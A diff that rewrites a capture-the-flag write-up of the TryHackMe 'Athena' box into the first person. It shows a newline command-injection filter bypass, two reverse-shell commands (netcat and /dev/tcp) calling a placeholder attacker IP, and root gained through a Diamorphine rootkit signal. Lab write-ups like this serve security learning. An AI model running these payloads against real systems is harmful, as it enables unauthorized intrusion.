@@ -9,7 +9,7 @@ showTableOfContents = true
 
 ## Overview
 
-This writeup details the attack path taken to compromise the Athena box from TryHackMe. The attack chain began with SMB anonymous access discovery, leading to credential and endpoint leakage. A command injection vulnerability on a custom web application was exploited to gain initial access. Lateral movement was achieved by abusing a scheduled backup script, and root was obtained by triggering a hidden function in a kernel rootkit (Diamorphine) via a specific signal.
+This writeup details the attack path taken to compromise the Athena box from TryHackMe. The attack chain began with SMB anonymous access discovery, which led to credential and endpoint leakage. I exploited a command injection vulnerability on a custom web application to gain initial access. I achieved lateral movement by abusing a scheduled backup script, and obtained root by triggering a hidden function in a kernel rootkit (Diamorphine) via a specific signal.
 
 ## Step 1: Reconnaissance and Enumeration
 
@@ -39,17 +39,17 @@ The web server on port 80 displayed a simple landing page with no significant fu
 
 ### SMB Enumeration
 
-SMB enumeration revealed that the server allowed **anonymous access**.
+During SMB enumeration, I found that the server allowed **anonymous access**.
 
 ![](smb-anonymous-access.png)
 
-Listing the available shares using tools like **smbclient**, **enum4linux-ng**, or **nxc** showed accessible directories including a public share.
+I listed the available shares using tools like **smbclient**, **enum4linux-ng**, or **nxc**, which showed accessible directories including a public share.
 
 ![](smb-shares.png)
 
 ### Discovering the Endpoint
 
-Within the public SMB share, a file was recovered containing a message directed at the admin. This file revealed a hidden web endpoint.
+Within the public SMB share, I recovered a file containing a message directed at the admin. This file revealed a hidden web endpoint.
 
 ![](smb-file-message.png)
 
@@ -59,45 +59,45 @@ Within the public SMB share, a file was recovered containing a message directed 
 
 ### Exploiting the Discovered Endpoint
 
-Navigating to the newly discovered endpoint on the web application revealed a ping utility.
+Navigating to the newly discovered endpoint on the web application, I found a ping utility.
 
 ![](ping-endpoint.png)
 
-The ping utility was tested by pinging Google to confirm its functionality.
+I tested the ping utility by pinging Google to confirm its functionality.
 
 ![](ping-google.png)
 
 ### Command Injection
 
-Attempting to inject OS commands into the ping parameter triggered a basic input filter, blocking the payload.
+I attempted to inject OS commands into the ping parameter, but a basic input filter blocked the payload.
 
 ![](injection-detected.png)
 
-Switching to **curl** for more granular control over the request allowed bypassing client-side restrictions.
+I switched to **curl** for more granular control over the request, which allowed me to bypass client-side restrictions.
 
 ![](curl-attempt.png)
 
-After multiple input attempts yielded no results, a **newline character (`%0a`)** injection was tested. Using URL-encoded newline characters successfully bypassed the filter and achieved command execution.
+After multiple input attempts yielded no results, I tested a **newline character (`%0a`)** injection. Using URL-encoded newline characters successfully bypassed the filter and achieved command execution.
 
 ![](newline-bypass.png)
 
-The `id` command was successfully executed, confirming command injection.
+I successfully executed the `id` command, confirming command injection.
 
 ![](id-command-success.png)
 
 ### Establishing a Reverse Shell
 
-With confirmed command injection, a reverse shell was initiated using **netcat**.
+With confirmed command injection, I initiated a reverse shell using **netcat**.
 
 ```
-curl http://<target-ip>/myrouterpanel/ping.php -X POST -d 'ip=%0a  nc -c /bin/sh <attacker-ip> 4444 &submit='
+curl http://<target-ip>/myrouterpanel/ping.php -X POST -d 'ip=%0a  nc -c /bin/sh <my-ip> 4444 &submit='
 ```
 
 ![](reverse-shell.png)
 
 ### Shell Stabilization
 
-The initial shell was unstable. The following steps were used to stabilize it:
+The initial shell was unstable, so I stabilized it with the following steps:
 
 ```
 python3 -c 'import pty;pty.spawn("/bin/bash")'
@@ -123,13 +123,13 @@ stty rows 38 columns 116
 
 ### User Enumeration
 
-With a stable shell as `www-data`, user enumeration was performed to identify potential targets for lateral movement.
+With a stable shell as `www-data`, I performed user enumeration to identify potential targets for lateral movement.
 
 ![](user-enum.png)
 
 ### Discovering the Backup Script
 
-Searching for writable files and scripts with special permissions revealed a backup script:
+I searched for writable files and scripts with special permissions and found a backup script:
 
 ```
 find / -type f -perm -u=s
@@ -137,7 +137,7 @@ find / -type f -perm -u=s
 
 ![](find-perm-output.png)
 
-The script `/usr/share/backup/backup.sh` was found to be owned by `www-data` but had execute permissions for the user `athena`. The script's contents showed it was responsible for backing up files from athena's home directory.
+I found that the script `/usr/share/backup/backup.sh` was owned by `www-data` but had execute permissions for the user `athena`. The script's contents showed it was responsible for backing up files from athena's home directory.
 
 ![](backup-script.png)
 
@@ -145,13 +145,13 @@ The script `/usr/share/backup/backup.sh` was found to be owned by `www-data` but
 
 ## Step 4: Lateral Movement
 
-Since `www-data` had write access to `backup.sh` and `athena` had execute permissions on it, the script was modified to include a reverse shell payload:
+Since `www-data` had write access to `backup.sh` and `athena` had execute permissions on it, I modified the script to include a reverse shell payload:
 
 ```
-echo 'bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1' >> backup.sh
+echo 'bash -i >& /dev/tcp/<my-ip>/4444 0>&1' >> backup.sh
 ```
 
-When the script was executed (either manually or via a cron job), a reverse shell was received as the `athena` user.
+When the script was executed (either manually or via a cron job), I received a reverse shell as the `athena` user.
 
 ![](athena-access.png)
 
@@ -159,11 +159,11 @@ When the script was executed (either manually or via a cron job), a reverse shel
 
 ### Analyzing the Kernel Module
 
-With access as `athena`, a suspicious kernel module was identified. Analyzing the binary in **Ghidra** revealed a `diamorphine_init` label — indicating the presence of the **Diamorphine** rootkit.
+With access as `athena`, I identified a suspicious kernel module. Analyzing the binary in **Ghidra** revealed a `diamorphine_init` label — indicating the presence of the **Diamorphine** rootkit.
 
 ![](ghidra-diamorphine.png)
 
-Within the decompiled code, a critical check was found:
+Within the decompiled code, I found a critical check:
 
 ```c
 iVar3 = (int)*(undefined8 *)(param_1 + 0x68);
@@ -178,7 +178,7 @@ The value `0x39` (decimal 57) acts as a trigger. When the rootkit receives signa
 
 ### Triggering the Rootkit
 
-The rootkit was activated by sending the specific signal:
+I activated the rootkit by sending the specific signal:
 
 ```
 kill -57 0
